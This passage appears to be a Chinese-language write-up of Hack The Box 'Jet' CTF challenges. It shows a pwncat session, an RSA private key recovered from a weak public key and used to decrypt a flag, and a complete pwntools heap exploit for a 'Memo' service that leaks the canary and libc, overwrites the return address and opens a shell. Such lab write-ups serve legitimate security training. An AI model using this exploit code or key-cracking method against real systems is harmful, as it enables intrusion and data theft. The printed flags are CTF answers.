drwxr-xr-x 2 root root 4.0K Dec 28  2017 keys
-rw-r--r-- 1 root root 4.7K Dec 28  2017 secret.enc
```

将密钥文件以及加密后的文件都下载到本地

```shell
(local) pwncat$ download secret.enc
secret.enc ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 4.8/4.8 KB • ? • 0:00:00
[21:25:37] downloaded 4.77KiB in 2.35 seconds                                                                                                                                                     download.py:71
(local) pwncat$ download key.bin.enc
key.bin.enc ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 129/129 bytes • ? • 0:00:00
[21:25:44] downloaded 129.00B in 1.43 seconds
(local) pwncat$ download ./keys/public.crt
./keys/public.crt ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 451/451 bytes • ? • 0:00:00
[21:28:49] downloaded 451.00B in 1.65 seconds
```

然后使用 [Github - RsaCtfTool/RsaCtfTool](https://github.com/RsaCtfTool/RsaCtfTool) 进行破解

```shell
(env) ┌─[✗]─[randark@parrot]─[~]
└──╼ $ python3 ./tools/RsaCtfTool/RsaCtfTool.py --publickey public.crt --private
['public.crt']

[*] Testing key public.crt.
attack initialized...
attack initialized...
[*] Performing factordb attack on public.crt.
[*] Attack success with factordb method !

Results for public.crt:

Private key :
-----BEGIN RSA PRIVATE KEY-----
MIICOQIBAAKBgQGN24SSfsyl/rFafZuCr54aBqEpk9fJDFa78Qnk177LTPwWgJPd
gY6ZZC9w7LWuy9+fSFfDnF4PI3DRPDpvvqmBjQh7jykg7N4FUC5dkqx4gBw+dfDf
ytHR1LeesYfJI6KF7s0FQhYOioCVyYGmNQoplt34bxbXgVvJZUMfBFC6LQKBgQCk
zWwClLUdx08Ezef0+356nNLVml7eZvTJkKjl2M6sE8sHiedfyQ4Hvro2yfkrMObc
EZHPnIba0wZ/8+cgzNxpNmtkG/CvNrZY81iw2lpm81KVmMIG0oEHy9V8RviVOGRW
i2CItuiV3AUIjKXT/TjdqXcW/n4fJ+8YuAMLUCV4ewIgSJiewFB8qwlK2nqa7taz
d6DQtCKbEwXMl4BUeiJVRkcCQQEIH6FjRIVKckAWdknyGOzk3uO0fTEH9+097y0B
A5OBHosBfo0agYxd5M06M4sNzodxqnRtfgd7R8C0dsrnBhtrAkEBgZ7n+h78BMxC
h6yTdJ5rMTFv3a7/hGGcpCucYiadTIxfIR0R1ey8/Oqe4HgwWz9YKZ1re02bL9fn
cIKouKi+xwIgSJiewFB8qwlK2nqa7tazd6DQtCKbEwXMl4BUeiJVRkcCIEiYnsBQ
fKsJStp6mu7Ws3eg0LQimxMFzJeAVHoiVUZHAkA3pS0IKm+cCT6r0fObMnPKoxur
bzwDyPPczkvzOAyTGsGUfeHhseLHZKVAvqzLbrEdTFo906cZWpLJAIEt8SD9
-----END RSA PRIVATE KEY-----
```

将破解出来的私钥保存为 `` 文件，然后执行解密

```shell
(env) ┌─[✗]─[randark@parrot]─[~]
└──╼ $ openssl pkeyutl -decrypt -inkey private.crt -in key.bin.enc -out file
(env) ┌─[randark@parrot]─[~]
└──╼ $ openssl aes-256-cbc -d -in secret.enc -pass file:file
*** WARNING : deprecated key derivation used.
Using -iter or -pbkdf2 would be better.
 ▄▄▄██▀▀▀▓█████▄▄▄█████▓      ▄████▄   ▒█████   ███▄ ▄███▓
   ▒██   ▓█   ▀▓  ██▒ ▓▒     ▒██▀ ▀█  ▒██▒  ██▒▓██▒▀█▀ ██▒    Congratulations!!
   ░██   ▒███  ▒ ▓██░ ▒░     ▒▓█    ▄ ▒██░  ██▒▓██    ▓██░
▓██▄██▓  ▒▓█  ▄░ ▓██▓ ░      ▒▓▓▄ ▄██▒▒██   ██░▒██    ▒██     Jet: https://jet.com/careers
 ▓███▒   ░▒████▒ ▒██▒ ░  ██▓ ▒ ▓███▀ ░░ ████▓▒░▒██▒   ░██▒    HTB: https://www.hackthebox.eu
 ▒▓▒▒░   ░░ ▒░ ░ ▒ ░░    ▒▓▒ ░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒░   ░  ░
 ▒ ░▒░    ░ ░  ░   ░     ░▒    ░  ▒     ░ ▒ ▒░ ░  ░      ░    JET{n3xt_t1m3_p1ck_65537}
 ░ ░ ░      ░    ░       ░   ░        ░ ░ ░ ▒  ░      ░
 ░   ░      ░  ░          ░  ░ ░          ░ ░         ░
                          ░  ░
                                  Props to:           ██░ ██  ▄▄▄       ▄████▄   ██ ▄█▀▄▄▄█████▓ ██░ ██ ▓█████  ▄▄▄▄    ▒█████  ▒██   ██▒     ▓█████  █    ██
                                                      ▓██░ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ ▓  ██▒ ▓▒▓██░ ██▒▓█   ▀ ▓█████▄ ▒██▒  ██▒▒▒ █ █ ▒░     ▓█   ▀  ██  ▓██▒
                                      blink (jet)     ▒██▀▀██░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ▒ ▓██░ ▒░▒██▀▀██░▒███   ▒██▒ ▄██▒██░  ██▒░░  █   ░     ▒███   ▓██  ▒██░
                                      g0blin (htb)    ░▓█ ░██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ░ ▓██▓ ░ ░▓█ ░██ ▒▓█  ▄ ▒██░█▀  ▒██   ██░ ░ █ █ ▒      ▒▓█  ▄ ▓▓█  ░██░
                                      forGP (htb)     ░▓█▒░██▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄  ▒██▒ ░ ░▓█▒░██▓░▒████▒░▓█  ▀█▓░ ████▓▒░▒██▒ ▒██▒ ██▓ ░▒████▒▒▒█████▓
                                      ch4p (htb)       ▒ ░░▒░▒ ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒  ▒ ░░    ▒ ░░▒░▒░░ ▒░ ░░▒▓███▀▒░ ▒░▒░▒░ ▒▒ ░ ░▓ ░ ▒▓▒ ░░ ▒░ ░░▒▓▒ ▒ ▒
                                      xero (0x00sec)   ▒ ░▒░ ░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░    ░     ▒ ░▒░ ░ ░ ░  ░▒░▒   ░   ░ ▒ ▒░ ░░   ░▒ ░ ░▒   ░ ░  ░░░▒░ ░ ░
                                                       ░  ░░ ░  ░   ▒   ░        ░ ░░ ░   ░       ░  ░░ ░   ░    ░    ░ ░ ░ ░ ▒   ░    ░   ░      ░    ░░░ ░ ░
                                                       ░  ░  ░      ░  ░░ ░      ░  ░             ░  ░  ░   ░  ░ ░          ░ ░   ░    ░    ░     ░  ░   ░
                                                                        ░                                             ░                     ░
```

```plaintext title="Flag"
JET{n3xt_t1m3_p1ck_65537}
```

## Memo

同样使用脚本进行二进制攻击

```python
#!/usr/bin/python3
from pwn import remote, p64, u64

shell = remote("10.13.37.10", 7777)

def create_memo(data, answer, more):
    shell.sendlineafter(b">", b"1")
    shell.sendlineafter(b"Data:", data)
    if answer[:3] == "yes":
        shell.sendafter(b"[yes/no]", answer.encode())
    else:
        shell.sendafter(b"[yes/no]", answer)
        shell.sendafter(b"Data:", more)

def show_memo():
    shell.sendlineafter(b">", b"2")
    shell.recvuntil(b"Data:")

def delete_memo():
    shell.sendlineafter(b">", b"3")

def tap_out(answer):
    shell.sendlineafter(b">", b"4")
    shell.sendafter(b"[yes/no]", answer)

create_memo(b"A" * 0x1f, b"no", b"A" * 0x1f)
show_memo()
shell.recv(0x20)

stack_chunk = u64(shell.recv(6) + b"\x00" * 2) - 0x110

delete_memo()
create_memo(b"A" * 0x28, b"no", b"A" * 0x28)
show_memo()
shell.recvuntil(b"A" * 0x28)
shell.recv(1)

canary = u64(b"\x00" + shell.recv(7))

create_memo(b"A" * 0x18, b"no", b"A" * 0x18)
create_memo(b"A" * 0x18, b"no", b"A" * 0x17)
show_memo()
shell.recvuntil(b"A" * 0x18)
shell.recv(1)

heap = u64(b"\x00" + shell.recv(3).ljust(7, b"\x00"))

create_memo(b"A" * 0x18, b"no", b"A" * 0x8 + p64(0x91) + b"A" * 0x8)
create_memo(b"A" * 0x7 + b"\x00", b"no", b"A" * 0x8)
create_memo(b"A" * 0x7 + b"\x00", b"no", b"A" * 0x8)
create_memo(b"A" * 0x7 + b"\x00", b"no", b"A" * 0x8)
create_memo(b"A" * 0x7 + b"\x00", b"no", b"A" * 0x8 + p64(0x31))
create_memo(b"A" * 0x7 + b"\x00", b"no", b"A" * 0x8)

tap_out(b"no\x00" + b"A" * 21 + p64(heap + 0xe0))
delete_memo()
tap_out(b"no\x00" + b"A" * 21 + p64(heap + 0xc0))
delete_memo()
show_memo()

leak = u64(shell.recv(6).ljust(8, b"\x00"))
libc = leak - 0x3c4b78

create_memo(b"A" * 0x28, b"no", b"A" * 0x10 + p64(0x0) + p64(0x21) + p64(stack_chunk))
create_memo(p64(leak) * (0x28 // 8), b"no", b"A" * 0x28)
create_memo(b"A" * 0x8 + p64(0x21) + p64(stack_chunk + 0x18) + b"A" * 0x8 + p64(0x21), "yes", b"")
create_memo(b"A" * 0x8, b"no", p64(canary) + b"A" * 0x8 + p64(libc + 0x45216))

tap_out(b"yes\x00")

shell.recvline()
shell.interactive()
```

得到

```shell
$ cat flag.txt
Congrats! JET{7h47s_7h3_sp1r17}

                               .\
                         .\   / _\   .\
                        /_ \   ||   / _\
                         ||    ||    ||
                  ; ,     \`.__||__.'/
          |\     /( ;\_.;  `./|  __.'
          '`.  _|_\/_;-'_ .' '||
           \ _/`       `.-\_ / ||      _
       , _ _`; ,--.   ,--. ;'_ _|,     |
       '`''\| /  ,-\ | _,-\ |/''`'  _  |
        \ .-- \__\_/ /` )_/ --. /   |  |       _
        /    .         -'.    \ --|--|--.  .' \
       |     /             \     |  |  |   \ |---'
    .   .  -'`-..____...-' `-  .   |  |    |\  _
 .'`'.__ `._      `-..-''_.'|   |  | _  | `-'      _
  \ .--.`.  `-..__    _,..-'   L|   |    |             |
   '    \ \      _,| |,_      /_7)  |    |   _       _ |  _
         \ \    /       \ _.-'/||        | .' \     _| |  |
          \ \  /.'|   |`.__.'` ||     .--| |--- _   /| |  |
           \ `//_/     \       ||    /   | \  _ \  / | |  |
            `/ \|       |      ||   |    |  `-'\/  |'--|      _
             `"`'.  _  .'||    `--'|                |   .--/
                  \ | /        ||                         '--'
                   |'|  mx'J        made me do it! ;)
                .-.|||.-.
               '----"----'
```

```plaintext title="Flag"
JET{7h47s_7h3_sp1r17}
```
